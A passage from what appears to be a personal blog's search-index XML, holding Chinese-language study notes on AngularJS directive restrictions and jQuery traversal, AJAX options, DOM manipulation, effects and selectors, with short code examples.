class="runoob-directive"&gt;&lt;/div&gt;注释&lt;!-- directive: runoob-directive --&gt; 限制使用通过添加 restrict 属性,并设置只值为 “A”, 来设置指令只能通过属性的方式来调用:1234567var app = angular.module("myApp", []);app.directive("runoobDirective", function() &#123; return &#123; restrict : "A", template : "&lt;h1&gt;自定义指令!&lt;/h1&gt;" &#125;;&#125;); restrict值可以是以下几种 E作为元素名使用 A作为属性名使用 C作为类名使用 M作为注释使用restrict 默认值为 EA, 即可以通过元素名和属性名来调用指令。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之遍历]]></title>
    <url>%2F2017%2F02%2F26%2Ffirst%2F</url>
    <content type="text"><![CDATA[jQuery遍历简介什么是遍历？jQuery遍历，意为”移动”，用于根据其相对于其他元素的关系来”查找”（或选取）HTML 元素。以某项选择开始，并沿着这个选择移动，直到抵达您期望的元素为止。下图展示了一个家族树。通过 jQuery 遍历，您能够从被选（当前的）元素开始，轻松地在家族树中向上移动（祖先），向下移动（子孙），水平移动（同胞）。这种移动被称为对 DOM 进行遍历。图示解析: div 元素是 ul 的父元素，同时是其中所有内容的祖先。 ul 元素是 li 元素的父元素，同时是 div 的子元素 左边的 li 元素是 span 的父元素，ul 的子元素，同时是 div 的后代。 span 元素是 li 的子元素，同时是ul 和 div 的后代。 两个 li 元素是同胞（拥有相同的父元素） 右边的 li 元素是 b 的父元素，ul 的子元素，同时是 div 的后代。 b 元素是右边的 li 的子元素，同时是 ul 和 div 的后代。jQuery祖先祖先是父、祖父或曾祖父等等。通过 jQuery，您能够向上遍历 DOM 树，以查找元素的祖先。向上遍历DOM树parent() parents() parentsUntil()jQuery parent()方法parent() 方法返回被选元素的直接父元素。123$(document).ready(function()&#123; $("span").parent();&#125;); jQuery parents()方法parents() 方法返回被选元素的所有祖先元素，它一路向上直到文档的根元素 ()。123$(document).ready(function()&#123; $("span").parents();&#125;); 接受参数可过滤对祖先元素的搜索123$(document).ready(function()&#123; $("span").parents("ul");&#125;); jQuery parentsUntil()方法parentsUntil() 方法返回介于两个给定元素之间的所有祖先元素。123$(document).ready(function()&#123; $("span").parentsUntil("div");&#125;); jQuery后代后代是子、孙、曾孙等等。通过 jQuery，您能够向下遍历 DOM 树，以查找元素的后代。children() find()jQuery children()方法children() 方法返回被选元素的所有直接子元素。该方法只会向下一级对 DOM 树进行遍历。123$(document).ready(function()&#123; $("div").children();&#125;); jQuery find()方法find() 方法返回被选元素的后代元素，一路向下直到最后一个后代。123$(document).ready(function()&#123; $("div").find("span");&#125;); 123$(document).ready(function()&#123; $("div").find("*");&#125;); jQuery同胞同胞拥有相同的父元素。通过 jQuery，您能够在 DOM 树中遍历元素的同胞元素。siblings() next() nextAll() nextUntil() prev() prevAll() prevUntil()jQuery siblings()方法siblings() 方法返回被选元素的所有同胞元素。123$(document).ready(function()&#123; $("h2").siblings();&#125;); 可以使用参数过滤123$(document).ready(function()&#123; $("h2").siblings("p");&#125;); jQuery next()方法next() 方法返回被选元素的下一个同胞元素。该方法只返回一个元素。123$(document).ready(function()&#123; $("h2").next();&#125;); jQuery nextAll()方法nextAll() 方法返回被选元素的所有跟随的同胞元素。下面的例子返回 h2 的所有跟随的同胞元素：123$(document).ready(function()&#123; $("h2").nextAll();&#125;); jQuery nextUntil()方法nextUntil() 方法返回介于两个给定参数之间的所有跟随的同胞元素。123$(document).ready(function()&#123; $("h2").nextUntil("h6");&#125;); jQuery prev(),prevAll(),prevUntil()方法类似。 jQuery过滤缩小搜索元素的范围三个最基本的过滤方法是:first()、last()和eq()，它们允许您基于其在一组元素中的位置来选择一个特定的元素。其他过滤方法，比如 filter() 和 not() 允许您选取匹配或不匹配某项指定标准的元素。jQuery first()方法first() 方法返回被选元素的首个元素。123$(document).ready(function()&#123; $("div p").first();&#125;); jQuery last()方法last() 方法返回被选元素的最后一个元素。123$(document).ready(function()&#123; $("div p").last();&#125;); jQuery eq()方法eq() 方法返回被选元素中带有指定索引号的元素。123$(document).ready(function()&#123; $("p").eq(1);&#125;); jQuery filter()方法filter() 方法允许您规定一个标准。不匹配这个标准的元素会被从集合中删除，匹配的元素会被返回。123$(document).ready(function()&#123; $("p").filter(".url");&#125;); jQuery not()方法not() 方法返回不匹配标准的所有元素。提示：not() 方法与 filter() 相反。123$(document).ready(function()&#123; $("p").not(".url");&#125;);]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[$.ajax()方法]]></title>
    <url>%2F2017%2F02%2F26%2Fthird%2F</url>
    <content type="text"><![CDATA[ajax的所有属性 名称 描述 async 布尔值，表示请求是否异步处理。默认是 true。 beforeSend(xhr) 发送请求前运行的函数。 cache 布尔值，表示浏览器是否缓存被请求页面。默认是 true。 complete(xhr,status) 请求完成时运行的函数（在请求成功或失败之后均调用，即在 success 和 error 函数之后）。 contentType 发送数据到服务器时所使用的内容类型。默认是：”application/x-www-form-urlencoded”。 context 为所有 AJAX 相关的回调函数规定 “this” 值。 data 规定要发送到服务器的数据 dataFilter(data,type) 用于处理 XMLHttpRequest 原始响应数据的函数。 dataType 预期的服务器响应的数据类型。 error(xhr,status,error) 如果请求失败要运行的函数。 global 布尔值，规定是否为请求触发全局 AJAX 事件处理程序。默认是 true。 ifModified 布尔值，规定是否仅在最后一次请求以来响应发生改变时才请求成功。默认是 false。 jsonp 在一个 jsonp 中重写回调函数的字符串。 jsonpCallback 在一个 jsonp 中规定回调函数的名称。 password 规定在 HTTP 访问认证请求中使用的密码。 processData 布尔值，规定通过请求发送的数据是否转换为查询字符串。默认是 true。 scriptCharset 规定请求的字符集。 success(result,status,xhr) 当请求成功时运行的函数。 timeout 设置本地的请求超时时间（以毫秒计）。 traditional 布尔值，规定是否使用参数序列化的传统样式。 type 规定请求的类型（GET 或 POST）。 url 规定发送请求的 URL。默认是当前页面。 username 规定在 HTTP 访问认证请求中使用的用户名。 xhr 用于创建 XMLHttpRequest 对象的函数。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之HTML]]></title>
    <url>%2F2017%2F02%2F25%2Fthird%2F</url>
    <content type="text"><![CDATA[jQuery获取内容和属性jQuery 中非常重要的部分，就是操作 DOM 的能力。jQuery 提供一系列与 DOM 相关的方法，这使访问和操作元素和属性变得很容易。获得内容- text()、html()以及val()三个简单实用的用于DOM操作的jQuery方法: text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值实例:123456$("#btn1").click(function()&#123; alert("Text: " + $("#test").text());&#125;);$("#btn2").click(function()&#123; alert("HTML: " + $("#test").html());&#125;); 123$("#btn1").click(function()&#123; alert("值为: " + $("#test").val());&#125;); 获取属性 -attr()jQuery attr() 方法用于获取属性值。实例:123$("button").click(function()&#123; alert($("#runoob").attr("href"));&#125;); jQuery设置内容和属性 text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值实例:123456789$("#btn1").click(function()&#123; $("#test1").text("Hello world!");&#125;);$("#btn2").click(function()&#123; $("#test2").html("&lt;b&gt;Hello world!&lt;/b&gt;");&#125;);$("#btn3").click(function()&#123; $("#test3").val("RUNOOB");&#125;); text()、html() 以及 val() 的回调函数实例:1234567891011$("#btn1").click(function()&#123; $("#test1").text(function(i,origText)&#123; return "旧文本: " + origText + " 新文本: Hello world! (index: " + i + ")"; &#125;);&#125;); $("#btn2").click(function()&#123; $("#test2").html(function(i,origText)&#123; return "旧 html: " + origText + " 新 html: Hello &lt;b&gt;world!&lt;/b&gt; (index: " + i + ")"; &#125;);&#125;); 设置属性 - attr()jQuery attr() 方法也用于设置/改变属性值。实例:123$("button").click(function()&#123; $("#runoob").attr("href","http://www.runoob.com/jquery");&#125;); attr() 方法也允许您同时设置多个属性。下面的例子演示如何同时设置 href 和 title 属性：实例:123456$("button").click(function()&#123; $("#runoob").attr(&#123; "href" : "http://www.runoob.com/jquery", "title" : "jQuery 教程" &#125;);&#125;); attr() 的回调函数jQuery 方法 attr()，也提供回调函数。回调函数有两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值。然后以函数新值返回您希望使用的字符串。实例:12345$("button").click(function()&#123; $("#runoob").attr("href", function(i,origValue)&#123; return origValue + "/jquery"; &#125;);&#125;); jQuery添加元素添加新的HTML内容 append() - 在被选元素的结尾插入内容 prepend() - 在被选元素的开头插入内容 after() - 在被选元素之后插入内容 before() - 在被选元素之前插入内容jQuery append()方法在被选元素的结尾出入内容。1$("p").append("追加文本"); jQuery prepend()方法在被选元素的开头插入内容。1$("p").prepend("在开头追加文本"); 在上面的例子中，我们只在被选元素的开头/结尾插入文本/HTML。实例:12345678function appendText()&#123; var txt1="&lt;p&gt;文本。&lt;/p&gt;"; // 使用 HTML 标签创建文本 var txt2=$("&lt;p&gt;&lt;/p&gt;").text("文本。"); // 使用 jQuery 创建文本 var txt3=document.createElement("p"); txt3.innerHTML="文本。"; // 使用 DOM 创建文本 text with DOM $("body").append(txt1,txt2,txt3); // 追加新元素&#125; jQuery after()和before()方法jQuery after() 方法在被选元素之后插入内容。jQuery before() 方法在被选元素之前插入内容。实例:123$("img").after("在后面添加文本"); $("img").before("在前面添加文本"); 通过 after() 和 before() 方法添加若干新元素after() 和 before() 方法能够通过参数接收无限数量的新元素。可以通过 text/HTML、jQuery 或者 JavaScript/DOM 来创建新元素。在下面的例子中，我们创建若干新元素。这些元素可以通过 text/HTML、jQuery 或者 JavaScript/DOM 来创建。然后我们通过 after() 方法把这些新元素插到文本中（对 before() 同样有效）：实例:12345678function afterText()&#123; var txt1="&lt;b&gt;I &lt;/b&gt;"; // 使用 HTML 创建元素 var txt2=$("&lt;i&gt;&lt;/i&gt;").text("love "); // 使用 jQuery 创建元素 var txt3=document.createElement("big"); // 使用 DOM 创建元素 txt3.innerHTML="jQuery!"; $("img").after(txt1,txt2,txt3); // 在图片后添加文本&#125; jQuery删除元素 remove() - 删除被选元素（及其子元素） empty() - 从被选元素中删除子元素jQuery remove()方法删除被选元素及其子元素。1$("#div1").remove(); jQuery empty()方法删除被选元素的子元素。1$("#div1").empty(); 过滤被删除的元素jQuery remove() 方法也可接受一个参数，允许您对被删元素进行过滤。该参数可以是任何 jQuery 选择器的语法。下面的例子删除 class=”italic” 的所有 元素：1$("p").remove(".italic"); jQuery-获取并设置CSS类 addClass() - 向被选元素添加一个或多个类 removeClass() - 从被选元素删除一个或多个类 toggleClass() - 对被选元素进行添加/删除类的切换操作 css() - 设置或返回样式属性样式表:12345678910.important&#123; font-weight:bold; font-size:xx-large;&#125; .blue&#123; color:blue;&#125; jQuery addClass()方法展示如何向不同的元素添加 class 属性。当然，在添加类时，您也可以选取多个元素：1234$("button").click(function()&#123; $("h1,h2,p").addClass("blue"); $("div").addClass("important");&#125;); 也可以规定多个类123$("button").click(function()&#123; $("#div1").addClass("important blue");&#125;); jQuery removeClass()方法演示如何在不同的元素中删除指定的 class 属性：123$("button").click(function()&#123; $("h1,h2,p").removeClass("blue");&#125;); jQuery toggleClass()方法该方法对被选元素进行添加/删除类的切换操作：123$("button").click(function()&#123; $("h1,h2,p").toggleClass("blue");&#125;); jQuery css()方法css() 方法设置或返回被选元素的一个或多个样式属性。返回CSS属性语法:1css("propertyname"); 下面的例子将返回首个匹配元素的 background-color 值：1$("p").css("background-color"); 设置CSS属性语法:1css("propertyname","value"); 下面的例子将为所有匹配元素设置 background-color 值：1$("p").css("background-color","yellow"); 设置多个CSS属性语法:1css(&#123;"propertyname":"value","propertyname":"value",...&#125;); 下面的例子将为所有匹配元素设置 background-color 和 font-size：1$("p").css(&#123;"background-color":"yellow","font-size":"200%"&#125;); jQuery 尺寸方法:width()、height()、innerWidth()、innerHeight()、outerWidth()、outerHeight()jQuery width() 和 height() 方法width() 方法设置或返回元素的宽度（不包括内边距、边框或外边距）。height() 方法设置或返回元素的高度（不包括内边距、边框或外边距）。下面的例子返回指定的 元素的宽度和高度：123456$("button").click(function()&#123; var txt=""; txt+="div 的宽度是: " + $("#div1").width() + "&lt;/br&gt;"; txt+="div 的高度是: " + $("#div1").height(); $("#div1").html(txt);&#125;); jQuery innerWidth() 和 innerHeight() 方法innerWidth() 方法返回元素的宽度（包括内边距）。innerHeight() 方法返回元素的高度（包括内边距）。下面的例子返回指定的 元素的 inner-width/height：123456$("button").click(function()&#123; var txt=""; txt+="div 宽度，包含内边距: " + $("#div1").innerWidth() + "&lt;/br&gt;"; txt+="div 高度，包含内边距: " + $("#div1").innerHeight(); $("#div1").html(txt);&#125;); jQuery outerWidth() 和 outerHeight() 方法outerWidth() 方法返回元素的宽度（包括内边距和边框）。outerHeight() 方法返回元素的高度（包括内边距和边框）。下面的例子返回指定的 元素的 outer-width/height：123456$("button").click(function()&#123; var txt=""; txt+="div 宽度，包含内边距和边框: " + $("#div1").outerWidth() + "&lt;/br&gt;"; txt+="div 高度，包含内边距和边框: " + $("#div1").outerHeight(); $("#div1").html(txt);&#125;); jQuery HTML/CSS方法下面的方法适用于 HTML 和 XML 文档。除了：html() 方法。 方法 描述 addClass() 向被选元素添加一个或多个类名 after() 在被选元素后插入内容 append() 在被选元素的结尾插入内容 appendTo() 在被选元素的结尾插入 HTML 元素 attr() 设置或返回被选元素的属性/值 before() 在被选元素前插入内容 clone() 生成被选元素的副本 css() 为被选元素设置或返回一个或多个样式属性 detach() 移除被选元素（保留数据和事件） empty() 从被选元素移除所有子节点和内容 hasClass() 检查被选元素是否包含指定的 class 名称 height() 设置或返回被选元素的高度 html() 设置或返回被选元素的内容 innerHeight() 返回元素的高度（包含 padding，不包含 border） innerWidth() 返回元素的宽度（包含 padding，不包含 border） insertAfter() 在被选元素后插入 HTML 元素 insertBefore() 在被选元素前插入 HTML 元素 offset() 设置或返回被选元素的偏移坐标（相对于文档） offsetParent() 返回第一个定位的祖先元素 outerHeight() 返回元素的高度（包含 padding 和 border） outerWidth() 返回元素的宽度（包含 padding 和 border） position() 返回元素的位置（相对于父元素） prepend() 在被选元素的开头插入内容 prependTo() 在被选元素的开头插入 HTML 元素 prop() 设置或返回被选元素的属性/值 remove() 移除被选元素（包含数据和事件） removeAttr() 从被选元素移除一个或多个属性 removeClass() 从被选元素移除一个或多个类 removeProp() 移除通过 prop() 方法设置的属性 replaceAll() 把被选元素替换为新的 HTML 元素 replaceWith() 把被选元素替换为新的内容 scrollLeft() 设置或返回被选元素的水平滚动条位置 scrollTop() 设置或返回被选元素的垂直滚动条位置 text() 设置或返回被选元素的文本内容 toggleClass() 在被选元素中添加/移除一个或多个类之间切换 unwrap() 移除被选元素的父元素 val() 设置或返回被选元素的属性值（针对表单元素） width() 设置或返回被选元素的宽度 wrap() 在每个被选元素的周围用 HTML 元素包裹起来 wrapAll() 在所有被选元素的周围用 HTML 元素包裹起来 wrapInner() 在每个被选元素的内容周围用 HTML 元素包裹起来 $.escapeSelector() 转义CSS选择器中有特殊意义的字符或字符串 $.cssHooks 提供了一种方法通过定义函数来获取和设置特定的CSS值]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之效果方法]]></title>
    <url>%2F2017%2F02%2F25%2Fsecond%2F</url>
    <content type="text"><![CDATA[jQuery隐藏和显示制作隐藏、显示、切换、滑动、淡入淡出，以及动画。jQuery hide()和show()方法语法:12$(selector).hide(speed,callback);$(selector).show(speed,callback); 实例:123456$("#hide").click(function()&#123; $("p").hide();&#125;);$("#show").click(function()&#123; $("p").show();&#125;); 可选的 speed 参数规定隐藏/显示的速度，可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是隐藏或显示完成后所执行的函数名称。实例:123$("button").click(function()&#123; $("p").hide(1000);&#125;); jQuery toggle()方法语法:1$(selector).toggle(speed,callback); 通过jquery，您可以用toggle()方法来切换hide()和show()方法。显示被隐藏的元素，并隐藏已显示的元素：123$("button").click(function()&#123; $("p").toggle();&#125;); jQuery淡入淡出jQuery Fading方法fadeIn() fadeOut() fadeToggle() fadeTo()jQuery fadeIn()方法jQuery fadeIn() 用于淡入已隐藏的元素。语法:1$(selector).fadeIn(speed,callback); 实例:12345$("button").click(function()&#123; $("#div1").fadeIn(); $("#div2").fadeIn("slow"); $("#div3").fadeIn(3000);&#125;); jQuery fadeOut()方法 jQuery fadeOut() 方法用于淡出可见元素。语法:1$(selector).fadeOut(speed,callback); 可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是 fading 完成后所执行的函数名称。下面的例子演示了带有不同参数的 fadeOut() 方法：12345$("button").click(function()&#123; $("#div1").fadeOut(); $("#div2").fadeOut("slow"); $("#div3").fadeOut(3000);&#125;); jQuery fadeToggle()方法jQuery 教程jQuery 教程jQuery 简介jQuery 安装jQuery 语法jQuery 选择器jQuery 事件 jQuery 效果jQuery 隐藏/显示jQuery 淡入淡出jQuery 滑动jQuery 动画jQuery 停止动画jQuery CallbackjQuery 链 jQuery HTMLjQuery 捕获jQuery 设置jQuery 添加元素jQuery 删除元素jQuery CSS 类jQuery css() 方法jQuery 尺寸 jQuery 遍历jQuery 遍历jQuery 祖先jQuery 后代jQuery 同胞jQuery 过滤 jQuery AjaxjQuery AJAX 简介jQuery load() 方法jQuery get()/post() 方法 jQuery 其他jQuery noConflict() 方法jQuery JSONP jQuery 实例jQuery 实例 jQuery 参考手册jQuery 选择器jQuery 事件方法jQuery 效果方法jQuery HTML / CSS 方法jQuery 遍历方法jQuery AJAX 方法jQuery 杂项方法jQuery 属性 jQuery 插件jQuery ValidatejQuery AccordionjQuery AutocompletejQuery MessagejQuery 密码验证jQuery PrettydatejQuery TooltipjQuery Treeview← jQuery 效果 – 隐藏和显示 jQuery 效果 – 滑动 →jQuery 效果 - 淡入淡出通过 jQuery，您可以实现元素的淡入淡出效果。点击展示 淡入/淡出 面板实例jQuery fadeIn()演示 jQuery fadeIn() 方法。jQuery fadeOut()演示 jQuery fadeOut() 方法。jQuery fadeToggle()演示 jQuery fadeToggle() 方法。jQuery fadeTo()演示 jQuery fadeTo() 方法。jQuery Fading 方法通过 jQuery，您可以实现元素的淡入淡出效果。jQuery 拥有下面四种 fade 方法：fadeIn()fadeOut()fadeToggle()fadeTo()jQuery fadeIn() 方法jQuery fadeIn() 用于淡入已隐藏的元素。语法:$(selector).fadeIn(speed,callback);可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。.可选的 callback 参数是 fading 完成后所执行的函数名称。下面的例子演示了带有不同参数的 fadeIn() 方法：实例$(“button”).click(function(){ $(“#div1”).fadeIn(); $(“#div2”).fadeIn(“slow”); $(“#div3”).fadeIn(3000);}); 尝试一下 » jQuery fadeOut() 方法jQuery fadeOut() 方法用于淡出可见元素。语法:$(selector).fadeOut(speed,callback);可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是 fading 完成后所执行的函数名称。下面的例子演示了带有不同参数的 fadeOut() 方法：实例$(“button”).click(function(){ $(“#div1”).fadeOut(); $(“#div2”).fadeOut(“slow”); $(“#div3”).fadeOut(3000);}); 尝试一下 » jQuery fadeToggle() 方法jQuery fadeToggle() 方法可以在 fadeIn() 与 fadeOut() 方法之间进行切换。如果元素已淡出，则 fadeToggle() 会向元素添加淡入效果。如果元素已淡入，则 fadeToggle() 会向元素添加淡出效果。语法:1$(selector).fadeToggle(speed,callback); 可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是 fading 完成后所执行的函数名称。下面的例子演示了带有不同参数的 fadeToggle() 方法：12345$("button").click(function()&#123; $("#div1").fadeToggle(); $("#div2").fadeToggle("slow"); $("#div3").fadeToggle(3000);&#125;); jQuery fadeTo()方法jQuery fadeTo() 方法允许渐变为给定的不透明度（值介于 0 与 1 之间）。语法:1$(selector).fadeTo(speed,opacity,callback); 必需的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。fadeTo() 方法中必需的 opacity 参数将淡入淡出效果设置为给定的不透明度（值介于 0 与 1 之间）。可选的 callback 参数是该函数完成后所执行的函数名称。下面的例子演示了带有不同参数的 fadeTo() 方法：实例:12345$("button").click(function()&#123; $("#div1").fadeTo("slow",0.15); $("#div2").fadeTo("slow",0.4); $("#div3").fadeTo("slow",0.7);&#125;); jQuery滑动jQuery 滑动方法可使元素上下滑动。slideDown() slideUp() slideToggle()jQuery slideDown()方法用于向下滑动元素。语法:1$(selector).slideDown(speed,callback); 可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是滑动完成后所执行的函数名称。下面的例子演示了 slideDown() 方法：实例:123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;script src="https://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt; $(document).ready(function()&#123; $("#flip").click(function()&#123; $("#panel").slideDown("slow"); &#125;);&#125;);&lt;/script&gt; &lt;style type="text/css"&gt; #panel,#flip&#123; padding:5px; text-align:center; background-color:#e5eecc; border:solid 1px #c3c3c3;&#125;#panel&#123; padding:50px; display:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="flip"&gt;点我滑下面板&lt;/div&gt;&lt;div id="panel"&gt;Hello world!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; jQuery slideUp() 方法用于向上滑动元素。语法:1$(selector).slideUp(speed,callback); 可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是滑动完成后所执行的函数名称。下面的例子演示了 slideUp() 方法：实例1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;script src="https://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt; $(document).ready(function()&#123; $("#flip").click(function()&#123; $("#panel").slideUp("slow"); &#125;);&#125;);&lt;/script&gt; &lt;style type="text/css"&gt; #panel,#flip&#123; padding:5px; text-align:center; background-color:#e5eecc; border:solid 1px #c3c3c3;&#125;#panel&#123; padding:50px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="flip"&gt;点我拉起面板&lt;/div&gt;&lt;div id="panel"&gt;Hello world!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; jQuery slideToggle()方法jQuery slideToggle() 方法可以在 slideDown() 与 slideUp() 方法之间进行切换。如果元素向下滑动，则 slideToggle() 可向上滑动它们。如果元素向上滑动，则 slideToggle() 可向下滑动它们。语法:1$(selector).slideToggle(speed,callback); 可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是滑动完成后所执行的函数名称。下面的例子演示了 slideToggle() 方法：123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;script src="https://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt; $(document).ready(function()&#123; $("#flip").click(function()&#123; $("#panel").slideToggle("slow"); &#125;);&#125;);&lt;/script&gt; &lt;style type="text/css"&gt; #panel,#flip&#123; padding:5px; text-align:center; background-color:#e5eecc; border:solid 1px #c3c3c3;&#125;#panel&#123; padding:50px; display:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="flip"&gt;点我，显示或隐藏面板。&lt;/div&gt;&lt;div id="panel"&gt;Hello world!&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; jQuery动画animate()方法jQuery animate() 方法用于创建自定义动画。语法:1$(selector).animate(&#123;params&#125;,speed,callback); 必需的 params 参数定义形成动画的 CSS 属性。可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。可选的 callback 参数是动画完成后所执行的函数名称。下面的例子演示 animate() 方法的简单应用。它把 元素往右边移动了 250 像素：实例:123$("button").click(function()&#123; $("div").animate(&#123;left:'250px'&#125;);&#125;); jQuery animate()-操作多个属性12345678$("button").click(function()&#123; $("div").animate(&#123; left:'250px', opacity:'0.5', height:'150px', width:'150px' &#125;);&#125;); 注意：当使用 animate() 时，必须使用 Camel 标记法书写所有的属性名，比如，必须使用 paddingLeft 而不是 padding-left，使用 marginRight 而不是 margin-right，等等。同时，色彩动画并不包含在核心 jQuery 库中。如果需要生成颜色动画，您需要从 jquery.com 下载 颜色动画 插件。jQuery animate()-使用相对值可以定义相对值（该值相对于元素的当前值）。需要在值的前面加上 += 或 -=：实例:1234567$("button").click(function()&#123; $("div").animate(&#123; left:'250px', height:'+=150px', width:'+=150px' &#125;);&#125;); jQuery animate()-使用预定义的值您甚至可以把属性的动画值设置为 “show”、”hide” 或 “toggle”：实例:12345$("button").click(function()&#123; $("div").animate(&#123; height:'toggle' &#125;);&#125;); jQuery animate()-使用队列功能默认地，jQuery 提供针对动画的队列功能。这意味着如果您在彼此之后编写多个 animate() 调用，jQuery 会创建包含这些方法调用的”内部”队列。然后逐一运行这些 animate 调用。实例:1234567$("button").click(function()&#123; var div=$("div"); div.animate(&#123;height:'300px',opacity:'0.4'&#125;,"slow"); div.animate(&#123;width:'300px',opacity:'0.8'&#125;,"slow"); div.animate(&#123;height:'100px',opacity:'0.4'&#125;,"slow"); div.animate(&#123;width:'100px',opacity:'0.8'&#125;,"slow");&#125;); 12345$("button").click(function()&#123; var div=$("div"); div.animate(&#123;left:'100px'&#125;,"slow"); div.animate(&#123;fontSize:'3em'&#125;,"slow");&#125;); jQuery 停止动画jQuery stop()方法jQuery stop() 方法用于停止动画或效果，在它们完成之前。stop() 方法适用于所有 jQuery 效果函数，包括滑动、淡入淡出和自定义动画。语法:1$(selector).stop(stopAll,goToEnd); 可选的 stopAll 参数规定是否应该清除动画队列。默认是 false，即仅停止活动的动画，允许任何排入队列的动画向后执行。可选的 goToEnd 参数规定是否立即完成当前动画。默认是 false。因此，默认地，stop() 会清除在被选元素上指定的当前动画。下面的例子演示 stop() 方法，不带参数：实例:123$("#stop").click(function()&#123; $("#panel").stop();&#125;); jQuery方法链接通过 jQuery，可以把动作/方法链接在一起。Chaining 允许我们在一条语句中运行多个 jQuery 方法（在相同的元素上）。下面的例子把 css()、slideUp() 和 slideDown() 链接在一起。”p1” 元素首先会变为红色，然后向上滑动，再然后向下滑动：1$("#p1").css("color","red").slideUp(2000).slideDown(2000); jQuery效果方法 方法 描述 animate() 对被选元素应用”自定义”的动画 clearQueue() 对被选元素移除所有排队函数（仍未运行的） delay() 对被选元素的所有排队函数（仍未运行）设置延迟 dequeue() 移除下一个排队函数，然后执行函数 fadeIn() 逐渐改变被选元素的不透明度，从隐藏到可见 fadeOut() 逐渐改变被选元素的不透明度，从可见到隐藏 fadeTo() 把被选元素逐渐改变至给定的不透明度 fadeToggle 在 fadeIn() 和 fadeOut() 方法之间进行切换 finish() 对被选元素停止、移除并完成所有排队动画 hide() 隐藏被选元素 queue() 显示被选元素的排队函数 show() 显示被选元素 slideDown() 通过调整高度来滑动显示被选元素 slideToggle() slideUp() 和 slideDown() 方法之间的切换 slideUp() 通过调整高度来滑动隐藏被选元素 stop() 停止被选元素上当前正在运行的动画 toggle() hide() 和 show() 方法之间的切换]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之选择器]]></title>
    <url>%2F2017%2F02%2F25%2Ffirst%2F</url>
    <content type="text"><![CDATA[简介jQuery选择器允许我们对HTML元素组或单个元素进行操作。jQuery选择器基于元素的id、类、类型、属性、属性值等”查找”(或选择)HTML元素。它基于已经存在的CSS选择器，除此之外，它还有一些自定义的选择器。jQuery中所有选择器都以美元符号开头:$()。 元素选择器jQuery元素选择器基于元素名选取元素。在页面中获取所有的元素。1$("p") 实例用户点击按钮后，所有元素隐藏:12345$(document).ready(function()&#123; $("button").click(function()&#123; $("p").hide();&#125;);&#125;); id选择器jQuery #id选择器通过HTML元素的id属性选取指定的元素。页面中元素的id应该是唯一的，所以我们要在页面中选取唯一的元素就可以通过#id选择器。1$("#test") 当用户点击按钮后，有id=”test”属性的元素将被隐藏:12345$(document).ready(function()&#123; $("button").click(function()&#123; $("#test").hide();&#125;);&#125;); .class选择器jQuery类选择器可以通过指定的class查找元素。1$(".test") 当用户点击按钮后所有带有class=”test”属性的元素都隐藏:12345$(document).ready(function()&#123; $("button").click(function()&#123; $(".test").hide();&#125;);&#125;); jQuery选择器示例 选择器 实例 选取 * $(“*”) 所有元素 #id $(“#lastname”) id=”lastname” 的元素 .class $(“.intro”) class=”intro” 的所有元素 .class .class $(“.intro,.demo”) class 为 “intro” 或 “demo” 的所有元素 element $(“p”) 所有 元素 el1,el2,el3 $(“h1,div,p”) 所有 h1、div 和 p 元素 :first $(“p:first”) 第一个 p 元素 :last $(“p:last”) 最后一个 p 元素 :even $(“tr.even” 所有偶数 tr 元素，索引值从 0 开始，第一个元素是偶数 (0)，第二个元素是奇数 (1)，以此类推。 :odd $(“tr.odd”) 所有奇数 tr 元素，索引值从 0 开始，第一个元素是偶数 (0)，第二个元素是奇数 (1)，以此类推。 :first-child $(“p:first-child”) 